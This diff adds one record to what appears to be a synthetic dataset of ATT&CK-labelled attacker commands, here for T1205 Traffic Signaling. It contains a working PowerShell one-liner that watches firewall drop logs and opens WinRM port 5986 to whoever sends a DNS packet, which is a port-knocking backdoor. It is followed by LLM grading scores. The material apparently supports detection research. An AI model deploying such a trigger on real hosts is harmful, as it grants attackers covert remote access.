@@ -1,0 +1,58 @@
+{
+  "technique_id": "T1205",
+  "platform": "Windows",
+  "shell": "PowerShell",
+  "command": "Invoke-Command -ComputerName localhost -ScriptBlock { $log = \"$env:SystemRoot\\System32\\LogFiles\\Firewall\\pfirewall.log\"; Set-NetFirewallProfile -All -LogAllowed $true -LogDropped $true -LogFileName $log | Out-Null; Get-Content -Path $log -Tail 0 -Wait | ForEach-Object { if ($_ -match 'DROP\\s+UDP\\s+(\\d{1,3}(?:\\.\\d{1,3}){3})\\s+\\d{1,3}(?:\\.\\d{1,3}){3}\\s+\\d+\\s+53\\b') { $src=$matches[1]; $name=\"dns-txt-5986-$($src.Replace('.','-'))\"; if (-not (Get-NetFirewallRule -DisplayName $name -ErrorAction SilentlyContinue)) { New-NetFirewallRule -DisplayName $name -Direction Inbound -Action Allow -Protocol TCP -LocalPort 5986 -RemoteAddress $src -Profile Any | Out-Null; Start-Job { param($n) Start-Sleep -Seconds 300; Remove-NetFirewallRule -DisplayName $n } -ArgumentList $name | Out-Null; } } } }",
+  "explanation": "Uses unusual inbound DNS packets (UDP/53 to a non-DNS host) as a signal to permit WinRM over HTTPS (5986) for the source IP.",
+  "rationale_steps": [
+    "Enable firewall dropped-packet logging",
+    "Detect inbound DNS queries to the host",
+    "Add a temporary allow rule for TCP/5986 restricted to the sender",
+    "Auto-remove after 5 minutes"
+  ],
+  "obfuscation_level": "none",
+  "id": "SYN-POWERSHELL-T1205-419c2bb8-dea8fbe0",
+  "source_prompt_hash": "419c2bb8",
+  "timestamp_utc": "2025-09-30T03:28:48.156174Z",
+  "validation": {
+    "syntax_ok": null,
+    "llm_judgments": [
+      {
+        "model": "gpt-5",
+        "syntactic_score": 5,
+        "syntactic_justification": "Well-formed PowerShell with balanced braces, correct quoting, valid cmdlets/parameters, and proper pipelines/separators.",
+        "semantic_score": 4,
+        "semantic_justification": "It monitors firewall DROP logs for UDP/53 as a signal and temporarily opens WinRM (5986) for the source IP, aligning with Traffic Signaling, but depends on admin privileges and enabled PSRemoting on localhost.",
+        "combined_score": 4.5,
+        "confidence": 0.8,
+        "timestamp": "2025-10-01T17:41:44.912318Z"
+      },
+      {
+        "model": "claude-sonnet-4-6",
+        "syntactic_score": 4,
+        "syntactic_justification": "The command is largely well-formed PowerShell with balanced braces, proper escaping, and valid cmdlet usage, though the double-backslash in the log path string and the regex pattern with escaped backslashes may cause minor issues depending on how the string is interpreted at runtime.",
+        "semantic_score": 5,
+        "semantic_justification": "The command accurately implements T1205 traffic signaling by monitoring Windows Firewall logs for dropped UDP/53 packets (unusual inbound DNS as a knock signal), then dynamically creating a temporary firewall rule to allow WinRM/HTTPS (TCP 5986) from the signaling source IP for 300 seconds before auto-removal, which is a textbook port-knocking/traffic-signaling C2 access mechanism.",
+        "combined_score": 4.5,
+        "confidence": 0.85,
+        "timestamp": "2026-02-19T04:02:34.572169Z"
+      },
+      {
+        "model": "gemini-3-flash-preview",
+        "syntactic_score": 5,
+        "syntactic_justification": "The PowerShell command is perfectly well-formed with balanced braces, valid pipe usage, and correct command-let syntax.",
+        "semantic_score": 4,
+        "semantic_justification": "The command perfectly demonstrates traffic signaling by using dropped packets as a trigger; however, it incorrectly uses C-style double-backslashes in a PowerShell single-quoted regex string, which will cause it to fail to match standard space-delimited log entries, and it requires administrative privileges despite the 'None' label.",
+        "combined_score": 4.5,
+        "confidence": 1,
+        "timestamp": "2026-02-19T04:02:45.115681Z"
+      }
+    ],
+    "llm_average_syntactic": 4.667,
+    "llm_average_semantic": 4.333,
+    "llm_average_score": 4.5,
+    "llm_verdict": "likely_match",
+    "sandbox_trace_id": null,
+    "mitre_match_score": null
+  }
+}
